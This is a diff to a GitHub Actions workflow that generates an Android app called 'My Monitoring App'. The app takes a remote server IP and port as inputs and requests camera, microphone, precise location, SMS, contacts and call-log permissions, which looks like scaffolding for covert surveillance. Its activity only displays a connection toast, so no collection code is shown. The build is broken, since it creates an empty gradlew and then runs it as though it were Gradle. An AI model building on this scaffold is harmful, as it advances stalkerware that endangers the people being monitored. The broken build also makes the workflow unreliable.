@@ -30,22 +30,38 @@ jobs:
 
       - name: Create Android app
         run: |
+          # إنشاء هيكل المشروع
           mkdir -p app/src/main/java/com/example/app
+          mkdir -p app/src/main/res/values
           
+          # AndroidManifest.xml
           cat > app/src/main/AndroidManifest.xml << 'EOF'
           <?xml version="1.0" encoding="utf-8"?>
-          <manifest package="com.example.app">
-              <application android:label="MyApp">
-                  <activity android:name=".MainActivity">
+          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
+              package="com.example.app">
+              <uses-permission android:name="android.permission.INTERNET"/>
+              <uses-permission android:name="android.permission.CAMERA"/>
+              <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+              <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+              <uses-permission android:name="android.permission.READ_SMS"/>
+              <uses-permission android:name="android.permission.READ_CONTACTS"/>
+              <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+              <application
+                  android:label="My Monitoring App"
+                  android:icon="@mipmap/ic_launcher">
+                  <activity
+                      android:name=".MainActivity"
+                      android:exported="true">
                       <intent-filter>
-                          <action android:name="android.intent.action.MAIN"/>
-                          <category android:name="android.intent.category.LAUNCHER"/>
+                          <action android:name="android.intent.action.MAIN" />
+                          <category android:name="android.intent.category.LAUNCHER" />
                       </intent-filter>
                   </activity>
               </application>
           </manifest>
           EOF
           
+          # MainActivity.java
           cat > app/src/main/java/com/example/app/MainActivity.java << 'EOF'
           package com.example.app;
           import android.app.Activity;
@@ -55,58 +71,86 @@ jobs:
               @Override
               protected void onCreate(Bundle savedInstanceState) {
                   super.onCreate(savedInstanceState);
-                  Toast.makeText(this, "Server: ${{ github.event.inputs.server_ip }}:${{ github.event.inputs.server_port }}", Toast.LENGTH_LONG).show();
+                  String serverIP = "${{ github.event.inputs.server_ip }}";
+                  String serverPort = "${{ github.event.inputs.server_port }}";
+                  Toast.makeText(this, "Connecting to " + serverIP + ":" + serverPort, Toast.LENGTH_LONG).show();
               }
           }
           EOF
           
+          # build.gradle للتطبيق
           cat > app/build.gradle << 'EOF'
           apply plugin: 'com.android.application'
+          
           android {
               compileSdkVersion 30
+              buildToolsVersion "30.0.3"
+              
               defaultConfig {
                   applicationId "com.example.app"
                   minSdkVersion 21
                   targetSdkVersion 30
+                  versionCode 1
+                  versionName "1.0"
+              }
+              
+              buildTypes {
+                  debug {
+                      minifyEnabled false
+                  }
               }
           }
           EOF
           
-          echo "include ':app'" > settings.gradle
+          # settings.gradle
+          cat > settings.gradle << 'EOF'
+          include ':app'
+          EOF
           
+          # build.gradle الرئيسي
           cat > build.gradle << 'EOF'
           buildscript {
-              repositories { google() }
-              dependencies { classpath 'com.android.tools.build:gradle:4.2.2' }
+              repositories {
+                  google()
+                  mavenCentral()
+              }
+              dependencies {
+                  classpath 'com.android.tools.build:gradle:7.0.4'
+              }
+          }
+          
+          allprojects {
+              repositories {
+                  google()
+                  mavenCentral()
+              }
           }
           EOF
-
-      - name: Build APK
-        run: |
+          
+          # gradle-wrapper.properties
           mkdir -p gradle/wrapper
-          echo "distributionUrl=https\://services.gradle.org/distributions/gradle-6.7.1-bin.zip" > gradle/wrapper/gradle-wrapper.properties
+          cat > gradle/wrapper/gradle-wrapper.properties << 'EOF'
+          distributionBase=GRADLE_USER_HOME
+          distributionPath=wrapper/dists
+          distributionUrl=https\://services.gradle.org/distributions/gradle-7.5-bin.zip
+          zipStoreBase=GRADLE_USER_HOME
+          zipStorePath=wrapper/dists
+          EOF
+          
+          # gradlew
           touch gradlew
           chmod +x gradlew
-          ./gradlew assembleDebug
 
-      - name: Inspect Build Output
+      - name: Build APK with Gradle
         run: |
-          echo "=== List of all files in the workspace after build ==="
-          find . -type f -name "*.apk" -o -name "*.txt" -o -name "*.log" | sort
-          echo "=== End of file list ==="
-          echo ""
-          echo "=== Current directory structure ==="
-          ls -laR app/build/
-          echo "=== End of directory structure ==="
+          ./gradlew assembleDebug --stacktrace
 
-      - name: Find APK location
+      - name: Find and Upload APK
         run: |
-          echo "Searching for all APK files..."
-          find $GITHUB_WORKSPACE -name "*.apk" -type f | tee apk-list.txt
-          echo "APK files found:"
-          cat apk-list.txt
+          echo "Searching for APK files..."
+          find . -name "*.apk" -type f
           mkdir -p apk-output
-          find $GITHUB_WORKSPACE -name "*.apk" -type f -exec cp {} apk-output/ \;
+          find . -name "*.apk" -type f -exec cp {} apk-output/ \;
           ls -la apk-output/
 
       - name: Upload APK
